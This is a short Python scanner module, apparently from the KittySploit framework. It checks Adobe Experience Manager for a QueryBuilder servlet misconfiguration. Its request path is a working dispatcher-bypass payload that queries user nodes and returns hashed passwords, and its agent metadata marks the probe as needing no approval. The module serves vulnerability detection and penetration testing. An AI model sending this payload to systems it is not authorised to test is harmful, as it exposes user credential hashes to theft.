#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AEM hased password can be queried via QueryBuilder Servlet."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Query hashed password via QueryBuilder Servlet Detection',
        'description': 'AEM hased password can be queried via QueryBuilder Servlet.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'aem', 'misconfig', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://twitter.com/AEMSecurity/status/1372392101829349376'],
    }

    def run(self):
        path = '/bin/querybuilder.json.;%0aa.css?p.hits=full&property=rep:authorizableId&type=rep:User'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"success":true', 'rep:password',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='Query hashed password via QueryBuilder Servlet detected', path=path)
            return True
        return False

